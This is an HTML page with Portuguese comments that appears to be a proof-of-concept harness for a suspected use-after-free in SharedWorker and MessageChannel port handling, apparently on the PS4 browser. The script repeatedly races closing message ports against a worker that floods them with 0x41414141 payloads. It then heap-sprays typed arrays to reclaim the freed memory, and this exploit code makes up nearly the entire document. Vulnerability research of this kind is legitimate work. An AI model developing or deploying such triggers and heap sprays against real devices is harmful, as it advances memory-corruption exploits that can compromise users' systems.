<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 UAF Verifier</title>      
</head>
<body>

    <div class="section">
        <h2>SharedWorker UAF Verifier</h2>       
        <p>Status: <span id="status">Pronto</span></p>

        <label>Delay de Fechamento (ms): <input type="number" id="delayInput" value="2"></label>
        <br><br>
        <button onclick="startTest()">Iniciar Teste Controlado</button>
        <button onclick="stopTest()">Parar</button>
    </div>

    <div id="log" style="border:1px solid #ccc; height:300px; overflow-y:scroll; font-family:monospace; margin-top:10px;"></div>

    <script>
        let isRunning = false;
        let iteration = 0;
        
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML = `<div>[${iteration}] ${msg}</div>` + el.innerHTML;
        }      

        // Tenta preencher a memória rapidamente após o 'free'
        function heapSpray() {
            let spray = [];
            // Cria vários ArrayBuffers preenchidos com 0x41 (A)
            // Se o sistema tentar ler a memória liberada e ler 0x41414141,
            // confirmamos que controlamos o objeto (mesmo sem ver o log UART).
            for (let i = 0; i < 200; i++) {
                let arr = new Uint32Array(128);
                arr.fill(0x41414141); 
                spray.push(arr);
            }
            return spray;
        }

        async function startTest() {
            if (isRunning) return;
            isRunning = true;
            iteration = 0;
            document.getElementById('status').innerText = "Rodando...";
            document.getElementById('status').style.color = "red";
            
            const delay = parseInt(document.getElementById('delayInput').value);
            
            // Código do Worker que bombardeia a porta com padrão específico
            const workerCode = `
                onmessage = (e) => {
                    const port = e.ports[0];
                    const payload = new Uint32Array(32);
                    payload.fill(0x41414141); // Padrão 'AAAA' para debug
                    
                    // Loop infinito de alta velocidade
                    setInterval(() => {
                        // Tenta enviar mensagem. Se a porta do outro lado
                        // foi fechada e a memória liberada incorretamente,
                        // isso pode causar o panic.
                        try {
                            port.postMessage(payload);
                        } catch(e) {}
                    }, 0);
                }
            `;
            const blobUrl = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));

            while(isRunning) {
                iteration++;
                await runSingleRace(blobUrl, delay);
                
                // Pequena pausa para o Garbage Collector respirar e não travar por OOM
                if(iteration % 10 === 0) {
                    log("--- Pausa para GC ---");
                    await new Promise(r => setTimeout(r, 200));
                }
            }
        }

        function stopTest() {
            isRunning = false;
            document.getElementById('status').innerText = "Parado";
            document.getElementById('status').style.color = "black";
        }

        function runSingleRace(url, delayMs) {
            return new Promise((resolve) => {
                const mc = new MessageChannel();
                
                // Adiciona timestamp único para forçar nova instância do worker
                const sw = new SharedWorker(url, "race_" + iteration);
                
                sw.port.start();
                
                // Envia a porta para o worker começar o bombardeio
                sw.port.postMessage("init", [mc.port2]);

                // O MOMENTO CRÍTICO
                setTimeout(() => {
                    // 1. Fecha a porta (Free)
                    sw.port.close();
                    mc.port1.close();
                    
                    // 2. Tenta sobrescrever a memória liberada imediatamente (Re-alloc)
                    // Se houver um Use-After-Free, o worker vai escrever em cima deste spray
                    let trash = heapSpray(); 
                    
                    // Limpeza visual
                    sw.port.onmessage = null;
                    
                    // Retorna após um breve momento
                    setTimeout(() => {
                        trash = null; // Libera o spray
                        resolve();
                    }, 10);
                    
                }, delayMs);
            });
        }
    </script>
</body>
</html>
